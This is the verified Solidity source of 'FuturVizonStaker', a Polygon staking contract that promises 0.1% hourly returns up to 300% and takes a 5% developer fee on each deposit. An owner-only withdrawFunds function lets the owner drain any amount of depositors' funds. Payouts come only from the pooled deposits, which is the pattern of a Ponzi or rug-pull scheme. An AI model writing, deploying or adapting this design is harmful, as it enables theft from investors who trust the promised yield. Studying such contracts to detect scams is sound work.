/**
 *Submitted for verification at polygonscan.com on 2022-05-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }
   modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
     function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract FuturVizonStaker is Ownable {

    using SafeMath for uint256;

    uint256 private constant MIN_WITHDRAW = 0.0002 ether;
    uint256 private constant MIN_INVESTMENT = 0.005 ether;
    uint256 private constant TIME_STEP = 1 hours;
    uint256 private constant HOURLY_INTEREST_RATE = 1; // 0.1%
    uint256 private constant ON_WITHDRAW_AUTO_REINTEREST_RATE = 0; // 0%
    uint256 private constant PERCENTS_DIVIDER = 1000;
    uint256 private constant TOTAL_RETURN = 3000; // 300% After 125 Days

    address payable public developerAddress; //0x8771b172e381b9585959E5b652fB5ac8e170e965
    uint256 private constant DEVELOPER_FEES_PERC = 50;

    uint256 public totalInvested;
    uint256 public totalWithdrawal;
    uint256 public totalReinvested;
    bool public isSaleOpen = false;

    struct Investor {
        address addr;
        uint256 totalDeposit;
        uint256 totalWithdraw;
        uint256 totalReinvest;
        uint256 dividends;
        uint256 investmentCount;
        uint256 depositTime;
        uint256 lastWithdrawDate;
    }

    mapping(address => Investor) public investors;

    event OnInvest(address investor, uint256 amount);
    event OnReinvest(address investor, uint256 amount);
    event OnWithdraw(address investor, uint256 amount);
    event OnWithdrawFunds(address investor, uint256 amount);
    event OnDepositFunds(address investor, uint256 amount);

    constructor(address payable _developer) {
            isSaleOpen = true;
            developerAddress = _developer;
    }

    function invest() public payable {
        require(isSaleOpen, "Cannot invest at the moment");
        if (_invest(msg.sender, msg.value)) {
            emit OnInvest(msg.sender, msg.value);
        }
    }

    function depositFunds() external payable onlyOwner returns(bool) {
        require(msg.value > 0, "you can deposit more than 0 matic");
        return true;
    }

    function withdrawFunds(uint256 amount) external onlyOwner {
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to withdraw funds");
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function _invest(
        address _addr,
        uint256 _amount
    )   private returns (bool) {
        require(msg.value >= MIN_INVESTMENT,"Minimum investment is 0.005");

        Investor storage _investor = investors[_addr];
        if (_investor.addr == address(0)) {
            _investor.addr = _addr;
            _investor.depositTime = block.timestamp;
            _investor.lastWithdrawDate = block.timestamp;
        }

        if (block.timestamp > _investor.depositTime) {
            _investor.dividends = getDividends(_addr);
        }
        uint256 developerFees = _amount
            .mul(DEVELOPER_FEES_PERC)
            .div(1000);
        developerAddress.transfer(developerFees);

        _amount = _amount.sub(developerFees);
 
        _investor.depositTime = block.timestamp;
        _investor.investmentCount = _investor.investmentCount.add(1);
        _investor.totalDeposit = _investor.totalDeposit.add(_amount);
        totalInvested = totalInvested.add(_amount);

        return true;
    }

    function _reinvest(address _addr, uint256 _amount) private returns (bool) {
        Investor storage _investor = investors[_addr];
        require(_investor.totalDeposit > 0, "not active user");

        if (block.timestamp > _investor.depositTime) {
            _investor.dividends = getDividends(_addr);
        }
        _investor.totalDeposit = _investor.totalDeposit.add(_amount);
        _investor.totalReinvest = _investor.totalReinvest.add(_amount);
        totalReinvested = totalReinvested.add(_amount);

        return true;
    }

    function payoutOf(address _addr)
        public
        view
        returns (uint256 payout, uint256 max_payout)
    {
        max_payout = investors[_addr].totalDeposit.mul(TOTAL_RETURN).div(PERCENTS_DIVIDER);

        if (investors[_addr].totalWithdraw < max_payout && block.timestamp > investors[_addr].depositTime) {
            payout = investors[_addr]
                .totalDeposit
                .mul(HOURLY_INTEREST_RATE)
                .mul(block.timestamp.sub(investors[_addr].depositTime))
                .div(TIME_STEP.mul(PERCENTS_DIVIDER));
            payout = payout.add(investors[_addr].dividends);

            if (investors[_addr].totalWithdraw.add(payout) > max_payout) {
                payout = max_payout.subz(investors[_addr].totalWithdraw);
            }
        }
    }

    function getDividends(address addr) public view returns (uint256) {
        uint256 dividendAmount = 0;
        (dividendAmount, ) = payoutOf(addr);
        return dividendAmount;
    }

    function getContractInformation()
        public
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        uint256 contractBalance = getContractBalance();
        return (
            contractBalance,
            totalInvested,
            totalWithdrawal,
            totalReinvested
        );
    }

    function withdraw() public {
        require(
            investors[msg.sender].lastWithdrawDate.add(TIME_STEP) <=
                block.timestamp,
            "Withdrawal limit is 1 withdrawal in 1 hour"
        );
        uint256 _reinvestAmount = 0;
        uint256 totalToReinvest = 0;
        uint256 max_payout = investors[msg.sender]
            .totalDeposit
            .mul(TOTAL_RETURN)
            .div(PERCENTS_DIVIDER);
        uint256 dividendAmount = getDividends(msg.sender);

        if (
            investors[msg.sender].totalWithdraw.add(dividendAmount) > max_payout
        ) {
            dividendAmount = max_payout.subz(
                investors[msg.sender].totalWithdraw
            );
        }

        require(
            dividendAmount >= MIN_WITHDRAW,
            "min withdraw amount is 0.0002"
        );

        _reinvestAmount = dividendAmount
            .mul(ON_WITHDRAW_AUTO_REINTEREST_RATE)
            .div(1000);

        totalToReinvest = _reinvestAmount;

        _reinvest(msg.sender, totalToReinvest);

        uint256 remainingAmount = dividendAmount.subz(_reinvestAmount);

        totalWithdrawal = totalWithdrawal.add(remainingAmount);

        if (remainingAmount > getContractBalance()) {
            remainingAmount = getContractBalance();
        }

        investors[msg.sender].totalWithdraw = investors[msg.sender]
            .totalWithdraw
            .add(dividendAmount);
        investors[msg.sender].lastWithdrawDate = block.timestamp;
        investors[msg.sender].depositTime = block.timestamp;
        investors[msg.sender].dividends = 0;

        payable(msg.sender).transfer(remainingAmount);
        emit OnWithdraw(msg.sender, remainingAmount);
    }

    function setIsSaleOpen(bool _newValue) public onlyOwner {
        require(
            _newValue != isSaleOpen,
            "New value cannot be same with previous value"
        );
        isSaleOpen = _newValue;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function subz(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b >= a) {
            return 0;
        }
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}